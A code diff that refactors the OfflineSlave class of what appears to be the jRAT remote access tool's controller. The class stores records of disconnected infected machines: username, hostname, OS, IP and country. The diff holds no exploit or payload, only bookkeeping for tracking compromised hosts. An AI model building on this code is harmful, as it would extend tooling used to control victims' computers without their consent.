@@ -3,52 +3,44 @@ package io.jrat.controller;
 import java.util.Random;
 
 
-public class OfflineSlave {
+public class OfflineSlave extends AbstractSlave {
 
-	protected String userstring;
 	protected String os;
-	protected String serverid;
-	protected String version;
-	protected String ip;
-	protected String country;
 	protected long creation = System.currentTimeMillis();
 	protected long randomId = newRandomId();
 	
 	public OfflineSlave(AbstractSlave slave) {
-		this.userstring = slave.getDisplayName();
-		this.os = slave.getOperatingSystem().getType().getName();
-		this.serverid = slave.getID();
-		this.version = slave.getVersion();
-		this.ip = slave.getRawIP();
-		this.country = slave.getCountry();
+		this(slave.getUsername(), slave.getHostname(), slave.getOperatingSystem().getType().getName(), slave.getID(), slave.getVersion(), slave.getRawIP(), slave.getCountry());
 	}
 	
-	public OfflineSlave(String userstring, String longosname, String serverid, String version, String ip, String country) {
-		this(userstring, longosname, serverid, version, ip, country, System.currentTimeMillis());
+	public OfflineSlave(String username, String hostname, String longosname, String id, String version, String ip, String country) {
+		this(username, hostname, longosname, id, version, ip, country, System.currentTimeMillis());
 	}
 	
-	public OfflineSlave(String userstring, String longosname, String serverid, String version, String ip, String country, long creation) {
-		this.userstring = userstring;
+	public OfflineSlave(String username, String hostname, String longosname, String id, String version, String ip, String country, long creation) {
+		super(null, null);
+		super.username = username;
+		super.hostname = hostname;
 		this.os = longosname;
-		this.serverid = serverid;
-		this.version = version;
-		this.ip = ip;
-		this.country = country;
+		super.id = id;
+		super.version = version;
+		super.ip = ip;
+		super.country = country;
 		this.creation = creation;
 	}
 	
 	public static OfflineSlave fromString(String s) {
 		String[] array = s.split(":");
-		OfflineSlave os = new OfflineSlave(array[0], array[1], array[2], array[3], array[4], array[5], Long.parseLong(array[6]));
-		os.setCreation(Long.parseLong(array[7]));
+		OfflineSlave os = new OfflineSlave(array[0], array[1], array[2], array[3], array[4], array[5], array[6], Long.parseLong(array[8]));
 		return os;
 	}
 	
 	public static String toString(OfflineSlave slave) {
 		StringBuilder sb = new StringBuilder();
-		sb.append(slave.userstring + ":");
+		sb.append(slave.username + ":");
+		sb.append(slave.hostname + ":");
 		sb.append(slave.os + ":");
-		sb.append(slave.serverid + ":");
+		sb.append(slave.id + ":");
 		sb.append(slave.version + ":");
 		sb.append(slave.ip + ":");
 		sb.append(slave.country + ":");
@@ -96,10 +88,20 @@ public class OfflineSlave {
 		if (o instanceof OfflineSlave) {
 			OfflineSlave os = (OfflineSlave)o;
 			
-			return os.userstring.equals(this.userstring) && os.serverid.equals(this.serverid) && os.version.equals(this.version) && os.ip.equals(this.ip);
+			return os.username.equals(this.username) && os.hostname.equals(this.hostname) && os.id.equals(this.id) && os.version.equals(this.version) && os.ip.equals(this.ip);
 		} else {
 			return false;
 		}
+	}
+
+	@Override
+	public void ping() {
+		throw new RuntimeException("Can't ping offline slave");
+	}
+
+	@Override
+	public void run() {
+
 	}
 
 }
